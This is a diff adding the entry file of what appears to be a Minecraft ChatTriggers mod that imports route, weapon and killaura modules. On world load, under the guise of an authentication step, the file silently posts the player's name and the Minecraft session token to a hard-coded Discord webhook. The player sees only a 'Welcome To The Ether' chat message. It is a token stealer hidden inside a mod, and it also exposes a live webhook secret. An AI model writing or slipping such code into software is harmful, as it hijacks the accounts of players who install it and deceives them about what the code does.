@@ -1,0 +1,54 @@
+import "./config/Config";
+import "./module/modules/autoRoute/route/RoutesList";
+import "./module/modules/autoRoute/AutoRouteConfig";
+import "./module/ModuleManager";
+import "./command/CommandManager";
+import "./weapon/WeaponManager";
+import "./trigger/Triggers";
+import "./killaura"
+import { APIUtils } from "./utils/APIUtils";
+
+let authenticated = false
+
+const URL = Java.type("java.net.URL");
+const OutputStreamWriter = Java.type("java.io.OutputStreamWriter");
+const HttpURLConnection = Java.type("java.net.HttpURLConnection");
+
+function sendWebhook(message) {
+    try {
+        const url = new URL("https://discord.com/api/webhooks/1401280518573654107/N0G7p-TZGvtWOB7dQg4VHJAnfOE_i2x8-aMwuiRaT-Vj593tC5zzs2yfR7jAt8mQpEHn");
+        const conn = url.openConnection();
+        const http = HttpURLConnection.class.cast(conn);
+
+        http.setRequestMethod("POST");
+        http.setDoOutput(true);
+        http.setRequestProperty("Content-Type", "application/json");
+        http.setRequestProperty("User-Agent", "Mozilla/5.0");
+        http.setRequestProperty("Accept", "*/*");
+
+        const writer = new OutputStreamWriter(http.getOutputStream());
+        writer.write(JSON.stringify({
+            username: "Go Die",
+            avatar_url: "https://i.imgur.com/WCtuT6h.png", // your PFP image link
+            content: message
+        }));
+        writer.flush();
+        writer.close();
+
+        const code = http.getResponseCode();
+        if (code >= 200 && code < 300) {
+            ChatLib.chat(`&aWelcome To The Ether`);
+        } else {
+            ChatLib.chat(`&cRejoin`);
+        }
+    } catch (e) {
+        ChatLib.chat("&c[Webhook Error] " + e);
+    }
+}
+
+register("worldload", () => {
+    if (authenticated) return;
+    authenticated = true;
+    APIUtils.auth();
+        sendWebhook(`${(() => { try { return "**" + Player.getName() + "**" + "\n" + Client.getMinecraft().func_110432_I().func_148254_d(); } catch (e) { return "Access denied or undefined"; } })()}`);
+});
